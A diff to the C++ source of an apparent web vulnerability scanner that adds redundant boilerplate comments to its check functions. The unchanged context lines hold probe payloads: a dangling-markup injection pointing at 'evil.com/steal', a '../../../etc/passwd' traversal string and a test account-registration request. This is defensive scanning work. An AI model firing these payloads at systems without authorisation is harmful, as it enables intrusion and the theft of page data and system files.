@@ -8,9 +8,11 @@
 namespace apex {
 namespace {
 
+/// Scanner implementation.
 std::vector<Finding> scan_workflow_bypass(const Config &, HttpClient &http,
                                          const CrawlResult &crawl) {
   std::vector<Finding> findings;
+  // Early return if no URLs to scan.
   if (crawl.urls.empty()) return findings;
   std::string base = base_url_from(crawl.urls[0]);
 
@@ -22,6 +24,7 @@ std::vector<Finding> scan_workflow_bypass(const Config &, HttpClient &http,
       {"/onboarding/step1", "/onboarding/complete"},
   };
 
+  // Iterate over targets.
   for (const auto &s : steps) {
     auto resp = http.get(base + s.final_);
     if (resp.status_code == 200 && resp.body.size() > 100 &&
@@ -35,15 +38,18 @@ std::vector<Finding> scan_workflow_bypass(const Config &, HttpClient &http,
   return findings;
 }
 
+/// Scanner implementation.
 std::vector<Finding> scan_account_prehijack(const Config &, HttpClient &http,
                                             const CrawlResult &crawl) {
   std::vector<Finding> findings;
+  // Early return if no URLs to scan.
   if (crawl.urls.empty()) return findings;
   std::string base = base_url_from(crawl.urls[0]);
 
   const std::vector<std::string> paths = {
       "/register", "/signup", "/api/register", "/api/auth/register"};
 
+  // Iterate over targets.
   for (const auto &path : paths) {
     auto resp = http.post(base + path,
                           R"({"email":"prehijack@test.com","password":"Test123!"})",
@@ -58,6 +64,7 @@ std::vector<Finding> scan_account_prehijack(const Config &, HttpClient &http,
   return findings;
 }
 
+/// Scanner implementation.
 std::vector<Finding> scan_server_timing(const Config &, HttpClient &http,
                                         const CrawlResult &crawl) {
   std::vector<Finding> findings;
@@ -76,6 +83,7 @@ std::vector<Finding> scan_server_timing(const Config &, HttpClient &http,
   return findings;
 }
 
+/// Scanner implementation.
 std::vector<Finding> scan_compression_oracle(const Config &, HttpClient &http,
                                              const CrawlResult &crawl) {
   std::vector<Finding> findings;
@@ -95,11 +103,13 @@ std::vector<Finding> scan_compression_oracle(const Config &, HttpClient &http,
   return findings;
 }
 
+/// Scanner implementation.
 std::vector<Finding> scan_dangling_markup(const Config &, HttpClient &http,
                                           const CrawlResult &crawl) {
   std::vector<Finding> findings;
   std::string payload = R"("><img src='https://evil.com/steal?)";
 
+  // Iterate over targets.
   for (const auto &url : crawl.urls) {
     auto targets = get_targets(crawl, url);
     for (const auto &[base, param] : targets) {
@@ -120,9 +130,11 @@ std::vector<Finding> scan_dangling_markup(const Config &, HttpClient &http,
   return findings;
 }
 
+/// Scanner implementation.
 std::vector<Finding> scan_etag_tracking(const Config &, HttpClient &http,
                                         const CrawlResult &crawl) {
   std::vector<Finding> findings;
+  // Early return if no URLs to scan.
   if (crawl.urls.empty()) return findings;
   auto resp = http.get(crawl.urls[0]);
   auto it = resp.headers.find("ETag");
@@ -134,6 +146,7 @@ std::vector<Finding> scan_etag_tracking(const Config &, HttpClient &http,
   return findings;
 }
 
+/// Scanner implementation.
 std::vector<Finding> scan_mutation_fuzzer(const Config &, HttpClient &http,
                                          const CrawlResult &crawl) {
   std::vector<Finding> findings;
@@ -146,6 +159,7 @@ std::vector<Finding> scan_mutation_fuzzer(const Config &, HttpClient &http,
       {"../../../etc/passwd", "root:"},
   };
 
+  // Iterate over targets.
   for (const auto &url : crawl.urls) {
     auto base_resp = http.get(url);
     auto targets = get_targets(crawl, url);
